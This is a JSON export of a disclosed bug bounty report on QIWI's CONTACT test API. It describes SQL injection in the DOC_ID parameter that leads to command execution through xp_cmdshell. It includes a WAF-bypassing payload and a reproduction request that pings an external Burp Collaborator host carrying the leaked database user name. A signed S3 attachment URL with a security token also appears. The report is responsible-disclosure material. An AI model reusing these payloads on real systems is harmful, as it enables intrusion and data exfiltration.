@@ -1,0 +1,439 @@
+{
+  "id": 1104111,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTA0MTEx",
+  "url": "https://hackerone.com/reports/1104111",
+  "title": "Remote Code Execution on contactws.contact-sys.com via SQL injection in TPrabhuObject.BeginOrder in parameter DOC_ID",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-02-16T09:49:51.031Z",
+  "submitted_at": "2021-02-16T09:49:51.081Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "honoki",
+    "url": "/honoki",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 215,
+    "url": "https://hackerone.com/qiwi",
+    "handle": "qiwi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "QIWI",
+      "twitter_handle": "QiwiRussia",
+      "website": "https://qiwi.com",
+      "about": "The QIWI brand is a family brand that consolidates several directions: kiosks, wallet, bank."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-04-14T08:35:06.041Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-03-25T15:39:25.010Z",
+  "team_member_agreed_on_going_public_at": "2021-04-14T08:35:05.899Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nThe API interface on https://contactws.contact-sys.com:3456/ accepts a `<REQUEST/>` body to interact with the server's AppServ object. Because of insufficient input validation, an attacker can abuse the `DOC_ID` parameter on the `TPrabhuObject` operation `BeginOrder` to inject arbitrary SQL statements into the underlying prepared statement. This leads to Remote Code Execution on the server and full database access to the underpinning database.\n\n## Technical details\n\nThe interface on `contactws.contact-sys.com:3456` offers a test environment for CONTACT integrators to test their integrations. It accepts `<REQUEST/>` messages to the AppServ object.\n\nAfter my similar reports from last year (See #816560, #816254, #816086) I decided to continue digging, and found the object class `TPrabhuObject` with action `BeginOrder`, which appeared to contain an SQL vulnerability, as evidenced by this request:\n\n```xml\n<REQUEST OBJECT_CLASS=\"TPrabhuObject\" ACTION=\"BeginOrder\" ExpectSigned=\"No\" INT_SOFT_ID=\"DA61D1CE-757F-44C3-B3F7-11A026C37CD4\" POINT_CODE=\"tzhr\" lang=\"en\"></REQUEST>\n```\n```xml\n<RESPONSE SIGN_IT=\"1\" RE=\"-6068\" ERR_TEXT=\"Incorrect syntax near '='\" GLOBAL_VERSION=\"15.11.2013 12:37:40\" GLOBAL_VERSION_SERVER=\"18.03.2018 21:03:00\"/>\n```\n\nBy brute-forcing attributes in the request, I discovered that the `DOC_ID` parameter was vulnerable:\n```xml\n<REQUEST OBJECT_CLASS=\"TPrabhuObject\" DOC_ID=\"abc\" ACTION=\"BeginOrder\" ExpectSigned=\"No\" INT_SOFT_ID=\"DA61D1CE-757F-44C3-B3F7-11A026C37CD4\" POINT_CODE=\"tzhr\" lang=\"en\"></REQUEST>\n```\n\n```xml\n<RESPONSE SIGN_IT=\"1\" RE=\"-6068\" ERR_TEXT=\"Invalid column name 'abc'\" GLOBAL_VERSION=\"15.11.2013 12:37:40\" GLOBAL_VERSION_SERVER=\"18.03.2018 21:03:00\"/>\n```\n\n\nTo exploit the vulnerability, it is possible to append an arbitrary number of SQL statements with the `;` delimiter, e.g. with `DOC_ID` set to:\n\n```sql\n3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping gn7ll5zpbouksfunsmig35nj8ae02p.burpcol'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXEC sp_SYS_ProtoOp @id=3\n```\n\nNote the use of the comments `/* ... */` which are needed to bypass the WAF that was configured after my reports from last year.\n\n## Steps to reproduce\n\n1. Execute the following request (change the burp collaborator URL to your own);\n\n    ```http\n    POST / HTTP/1.1\nHost: contactws.contact-sys.com:3456\nContent-Type: application/xml\n    \n    <REQUEST OBJECT_CLASS=\"TPrabhuObject\" ACTION=\"BeginOrder\" DOC_ID=\"3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.gn7ll5zpbouksfunsmig35nj8ae02p.burpcol'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXEC sp_SYS_ProtoOp @id=3\" ExpectSigned=\"No\" INT_SOFT_ID=\"DA61D1CE-757F-44C3-B3F7-11A026C37CD4\" POINT_CODE=\"tzhr\" lang=\"en\"></REQUEST>\n```\n\n4. Notice that the server waits for a while when it's executing the `ping` command, and observe your Burp Collaborator to see the DNS resolution of the ping request:\n\n    {F1197216}\n\n3. Note the DNS request contains `0x7300740065006e0064005f00610064006d00`, which decodes to `stend_admin`, the `SYSTEM_USER` name.\n\n## Disclaimer\n\nNote that I stopped all further testing after successfully confirming the `ping` command during validation of this bug, and after successfully leaking the `SYSTEM_USER` variable.\n\n## Recommendation\n\nSQL injection vulnerabilities can be remedied by escaping the user-supplied input instead of using it to construct a query. See the external references below for remediation details.\n\n## References\n\n[OWASP Prevention cheat sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md)\n\n## Impact\n\nBy executing arbitrary commands on the server, an attacker could compromise the integrity, availability and confidentiality of customer's financially sensitive data on the CONTACT server and database, and pivot onto other servers on the internal network.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1197216,
+      "file_name": "BurpSuitePro_Zk8cEZUg93.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0bi6w8rgcvjhhkoze2tm6hlvz6z6?response-content-disposition=attachment%3B%20filename%3D%22BurpSuitePro_Zk8cEZUg93.png%22%3B%20filename%2A%3DUTF-8%27%27BurpSuitePro_Zk8cEZUg93.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071429Z&X-Amz-Expires=1632&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=91a4b303793f14fb60df693f999729438c9f3a7af1f706b28cfa28ab22b44e5d",
+      "file_size": 38239,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-04-24T15:39:25.059Z",
+  "allow_singular_disclosure_after": -76174504.25666845,
+  "singular_disclosure_allowed": true,
+  "vote_count": 52,
+  "voters": [
+    "shino001",
+    "haxor31337",
+    "battle_angel",
+    "ninetynine",
+    "ali",
+    "emin-skrijelj",
+    "sudi",
+    "theappsec",
+    "ibring",
+    "xsstestov",
+    "and 42 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 18737,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.contact-sys.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 10682330,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Thanks for the report. We'll investigate and comment in near future. ",
+      "automated_response": false,
+      "created_at": "2021-02-16T09:52:16.300Z",
+      "updated_at": "2021-02-16T09:52:16.300Z",
+      "actor": {
+        "username": "danr0",
+        "cleared": false,
+        "verified": false,
+        "url": "/danr0",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/3tVP7iXagmhQW2eYSzkZErvk/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "qiwi"
+    },
+    {
+      "id": 10834671,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @danr0 - I haven't heard back on these reports for 10 days; is there any update on these?",
+      "automated_response": false,
+      "created_at": "2021-03-01T07:31:02.743Z",
+      "updated_at": "2021-03-01T07:31:02.743Z",
+      "actor": {
+        "username": "honoki",
+        "cleared": true,
+        "verified": true,
+        "url": "/honoki",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "qiwi"
+    },
+    {
+      "id": 10837627,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi!\nSorry for inconvenience, we are waiting for transaction to charge our balance. I hope you will receive bounty in nearest days :)",
+      "automated_response": false,
+      "created_at": "2021-03-01T11:07:40.247Z",
+      "updated_at": "2021-03-01T11:07:40.247Z",
+      "actor": {
+        "username": "vankyver",
+        "cleared": false,
+        "verified": false,
+        "url": "/vankyver",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "qiwi"
+    },
+    {
+      "id": 10849338,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Thank you for your help!\nThe amount of bounty due the same reason as in previous reports (test payment functionality in test environment)",
+      "automated_response": false,
+      "created_at": "2021-03-02T09:08:42.694Z",
+      "updated_at": "2021-03-02T09:08:42.694Z",
+      "actor": {
+        "url": "/qiwi",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "QIWI"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "qiwi",
+      "collaborator": {
+        "username": "honoki",
+        "url": "/honoki"
+      }
+    },
+    {
+      "id": 10849341,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-03-02T09:08:51.937Z",
+      "updated_at": "2021-03-02T09:08:51.937Z",
+      "actor": {
+        "username": "vankyver",
+        "cleared": false,
+        "verified": false,
+        "url": "/vankyver",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "honoki",
+        "url": "/honoki"
+      },
+      "genius_execution_id": null,
+      "team_handle": "qiwi"
+    },
+    {
+      "id": 10852160,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Hi @vankyver - thanks for the info and the bounty! If you'll agree, I would also like to disclose these reports.\n\nKind regards,\nPieter",
+      "automated_response": false,
+      "created_at": "2021-03-02T13:52:02.284Z",
+      "updated_at": "2021-03-02T13:52:02.284Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "honoki",
+        "cleared": true,
+        "verified": true,
+        "url": "/honoki",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "qiwi"
+    },
+    {
+      "id": 10863020,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi, yes we agree to disclose it, but not now.\nI think we will do it in two weeks when all other things that we found will be fixed.",
+      "automated_response": false,
+      "created_at": "2021-03-03T09:39:22.036Z",
+      "updated_at": "2021-03-03T09:39:22.036Z",
+      "actor": {
+        "username": "vankyver",
+        "cleared": false,
+        "verified": false,
+        "url": "/vankyver",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "qiwi"
+    },
+    {
+      "id": 10864875,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Perfect, thank you!",
+      "automated_response": false,
+      "created_at": "2021-03-03T13:40:49.406Z",
+      "updated_at": "2021-03-03T13:40:49.406Z",
+      "actor": {
+        "username": "honoki",
+        "cleared": true,
+        "verified": true,
+        "url": "/honoki",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "qiwi"
+    },
+    {
+      "id": 11119119,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CancelledDisclosureRequest",
+      "message": "We will try to disclose this report in next month.",
+      "automated_response": false,
+      "created_at": "2021-03-25T14:01:57.951Z",
+      "updated_at": "2021-03-25T14:01:57.951Z",
+      "actor": {
+        "username": "vankyver",
+        "cleared": false,
+        "verified": false,
+        "url": "/vankyver",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "qiwi"
+    },
+    {
+      "id": 11120667,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Ok, I'm requesting disclosure again to accept when you're ready.",
+      "automated_response": false,
+      "created_at": "2021-03-25T15:39:25.032Z",
+      "updated_at": "2021-03-25T15:39:25.032Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "honoki",
+        "cleared": true,
+        "verified": true,
+        "url": "/honoki",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "qiwi"
+    },
+    {
+      "id": 11389418,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-04-14T08:35:05.936Z",
+      "updated_at": "2021-04-14T08:35:05.936Z",
+      "actor": {
+        "username": "vankyver",
+        "cleared": false,
+        "verified": false,
+        "url": "/vankyver",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "qiwi"
+    },
+    {
+      "id": 11389419,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-04-14T08:35:06.093Z",
+      "updated_at": "2021-04-14T08:35:06.093Z",
+      "actor": {
+        "username": "vankyver",
+        "cleared": false,
+        "verified": false,
+        "url": "/vankyver",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "qiwi"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
